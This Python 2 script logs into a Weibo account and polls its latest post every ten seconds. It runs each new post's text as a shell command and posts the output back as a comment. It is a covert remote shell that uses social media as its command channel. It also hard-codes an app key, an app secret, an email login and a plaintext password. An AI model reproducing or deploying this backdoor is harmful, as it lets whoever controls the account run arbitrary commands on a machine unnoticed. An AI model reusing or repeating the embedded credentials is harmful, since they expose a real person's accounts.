__author__ = 'joe'
# -*- coding: utf-8 -*-

import urllib2
import urllib
import time
import subprocess
from weibo import Client

APP_KEY = '600090630'
APP_SECRET = '8b23e7909bd6fa5261a17dd001b273a6'
CALLBACK_URL = 'https://api.weibo.com/oauth2/default.html'
AUTHID = 'http://api.weibo.com/oauth2/authorize'
USERID = 'xiaoliu920@163.com'
PASSWD = 'xiaoliu310620'

def main():
    '''获取用户第一条评论，当第一条微博改变时，进行命令执行，并在微博评论处返回执行信息'''

    c = Client(APP_KEY, APP_SECRET, CALLBACK_URL, username=USERID, password=PASSWD)

    print 'login success'
    print 'Listening'

    UID = c.get('account/get_uid')['uid']
    status = c.get('users/show', uid=UID)['status'] # 获取用户最近微博

    current_status = status

    while True:
        current_status = c.get('users/show', uid=UID)['status']
        current_text = current_status['text']
        current_id = current_status['id']
        print time.ctime(), current_text

        if current_id != status['id'] and current_text:
            tmp = subprocess.check_output(current_text, shell=True)
            tmp = tmp[:140]
            c.post('comment/create', id=current_id, comment=tmp)
            print tmp
            status = current_status
        time.sleep(10)

if __name__ == '__main__':
    main()